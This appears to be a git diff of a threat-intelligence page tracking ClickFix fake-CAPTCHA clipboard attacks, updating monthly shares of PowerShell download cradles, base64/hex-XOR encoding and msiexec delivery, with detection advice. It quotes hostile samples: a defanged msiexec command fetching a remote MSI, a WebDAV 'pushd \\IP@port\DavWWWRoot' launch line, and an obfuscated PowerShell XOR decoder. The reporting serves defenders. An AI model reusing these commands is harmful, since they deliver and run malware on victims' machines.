@@ -8,7 +8,7 @@ permalink: /trends/clickgrab/
 <style>
 /* ── Page layout ────────────────────────────────────────────────────────── */
 .cg-page { }
-.cg-page h1 { font-size: 1.6rem; font-weight: 700; color: var(--text); margin-bottom: .25rem; }
+.cg-page h1 { font-size: 1.6rem; font-weight: 700; margin-bottom: .25rem; } /* color: theme-arcade.css accent */
 .cg-page h2 { font-size: 1.15rem; font-weight: 700; color: var(--text); margin: 2.5rem 0 .75rem; border-bottom: 1px solid transparent; border-image: linear-gradient(to right, var(--accent), var(--border) 35%, transparent) 1; padding-bottom: .4rem; }
 .cg-page h3 { font-size: 1rem; font-weight: 600; color: var(--text); margin: 1.5rem 0 .5rem; }
 .cg-page p, .cg-page li { color: var(--text-muted); font-size: .9rem; line-height: 1.7; }
@@ -314,6 +314,10 @@ details[open] > summary { margin-bottom: 0.4rem; }
   <strong>The chokepoint didn't move.</strong> IWR → WebClient → Curl → IWR again. The download method rotated three times in six months. The detection signal didn't change once: PowerShell process spawned by an unusual parent (explorer.exe, cmd.exe from Run dialog) making an outbound HTTP connection. That's the difference between detecting the tool and detecting the behavior.
 </div>
 
+<div class="cg-callout cg-callout--alert">
+  <strong>Summer 2026: rotation back to remote fetch.</strong> After the spring pivot to inline encoded payloads (April-May ran 65-92% no-remote-fetch), delivery swung back to download cradles. IWR climbed to 28% of June domains and 36% of July, WebClient to 15% then 24%, curl to 33% in July, while inline payloads dropped to 12%. Meanwhile msiexec, the late-2025 story, is finished: a brief 14% April blip, then 1% or less every month after, 0% in July. Same cradle families cycling on the same clipboard-to-execution invariant. Nothing new to detect, just old branches getting picked back up. (July is a partial month, exported mid-month, so treat its shares as directional.)
+</div>
+
 <!-- ── Chart C: Evasion Technique Trends ─────────────────────────────── -->
 <h2 id="evasion">Evasion Technique Trends: Where Adversaries Are Adapting</h2>
 <p>Think of this chart as a conversation between attackers and defenders. Rising lines = defenders forced a change. Flat lines with spikes = a specific campaign tried something, then moved on. The trends tell you which evasion techniques are gaining traction and which were one-off experiments.</p>
@@ -328,7 +332,7 @@ details[open] > summary { margin-bottom: 0.4rem; }
 </div>
 
 <div class="cg-callout cg-callout--warn">
-  <strong>The May base64 spike was one campaign, not a re-tooling.</strong> Hex-XOR (<code>-bxor</code>) is the persistent inline encoder of spring 2026: absent before March, then 16% of March domains, <strong>54% in April</strong> (97/181), 22% in May, and back to <strong>84% in June</strong> (62/74). Base64 stayed in the single digits (9% March, 8% April) until May, when it spiked to <strong>67%</strong> (354/528) almost entirely on one token (<code>frombase64string</code>, 352 of 354) before collapsing to 1% in June. The two encoders barely overlap (2 of May's 354 base64 domains also use hex-XOR), so this reads as a single base64 campaign cluster passing through, not a durable shift. Either way, if your rules match plaintext <code>iwr https://</code> strings you're seeing the encoded version now, not the decoded cradle. Detect the encoding act, not the encoder: <code>[Convert]::FromBase64String</code> piped to <code>iex</code>, the <code>-bxor</code> decode loop, or <code>-enc</code> from an unusual parent. The content is opaque; the execution context isn't.
+  <strong>The spring inline-encoding wave passed.</strong> Base64 spiked to <strong>67%</strong> of May domains (354/528), almost entirely one token (<code>frombase64string</code>, 352 of 354), then collapsed to near-zero (0% June, 1% July). It barely overlapped hex-XOR (2 of May's 354 base64 domains also used <code>-bxor</code>), so it reads as a single campaign cluster passing through, not a re-tooling. Hex-XOR ran its own arc, heavy through April and May (<strong>54% of April domains</strong> at 97/181, still 116 sites in May) before falling off through the summer: 16% June, 0% July. Neither inline encoder stuck. By July inline encoding is essentially gone and delivery has swung back to plaintext remote cradles (see the cradle chart above). The lesson holds either way: detect the encoding act, not the encoder. <code>[Convert]::FromBase64String</code> piped to <code>iex</code>, the <code>-bxor</code> decode loop, or <code>-enc</code> from an unusual parent. The content is opaque; the execution context isn't.
 </div>
 
 <div class="cg-callout cg-callout--warn">
@@ -344,7 +348,7 @@ details[open] > summary { margin-bottom: 0.4rem; }
 <pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>msiexec /i hxxps[://]shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/</code></pre>
 
 <div class="cg-callout cg-callout--alert">
-  <strong>Same chokepoint, different binary.</strong> <code>msiexec.exe</code> spawning from <code>cmd.exe</code> or Run dialog, fetching an MSI from a non-enterprise URL. That's the same parent→child process execution chokepoint (T1059/T1218) as the PowerShell cradles. The invariant is the process relationship, not the binary name. Oct 18% → <strong>Nov 87%</strong> → Dec 34% → Jan 24% → Feb 29% → Mar 2%.
+  <strong>Same chokepoint, different binary.</strong> <code>msiexec.exe</code> spawning from <code>cmd.exe</code> or Run dialog, fetching an MSI from a non-enterprise URL. That's the same parent→child process execution chokepoint (T1059/T1218) as the PowerShell cradles. The invariant is the process relationship, not the binary name. Oct 18% → <strong>Nov 87%</strong> → Dec 34% → Jan 24% → Feb 29% → Mar 2% → Apr 14% → 1% or less May through July (0% in July).
 </div>
 
 <h3>WScript/VBS: A Failed Diversification (Dec 2025 – Feb 2026)</h3>
@@ -354,7 +358,7 @@ details[open] > summary { margin-bottom: 0.4rem; }
 <h2 id="inline">Strategic Shift: Inline Payloads Bypassing Network Fetch Detection</h2>
 <p>Here's the finding that changes the detection calculus: <strong>92% of May 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline. The user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>
 
-<p>Base64 accounted for 67% of May domains (354/528), but that was a single-campaign spike (see above) - by June it collapsed to 1% while <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 65 instances in March) climbed back to 84%. A newer <strong>WebDAV delivery</strong> variant also appears, using <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> - no PowerShell, no HTTP, nothing to intercept at the network layer. The social engineering does double duty. Fake CAPTCHA comments inside the payload reinforce the lure:</p>
+<p>Base64 accounted for 67% of May domains (354/528), but that was a single-campaign spike (see above) - by June it collapsed to near-zero while <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 65 instances in March) held around 16% before fading to zero by July. A newer <strong>WebDAV delivery</strong> variant also appears, using <code>conhost --headless cmd /c "pushd \\IP@port\DavWWWRoot &amp;&amp; start GoogleUpdate"</code> - no PowerShell, no HTTP, nothing to intercept at the network layer. The social engineering does double duty. Fake CAPTCHA comments inside the payload reinforce the lure:</p>
 
 <pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>powershell -w hidden &lt;# I am not a robot - Cloudflare ID: 8e3f2a #&gt; $k='xK9mP2';$d='4a5b6c...';
 $b=[byte[]]@();for($i=0;$i-lt$d.Length;$i+=2){$b+=[byte]("0x"+$d.Substring($i,2))-bxor[byte]$k[$i%$k.Length]};
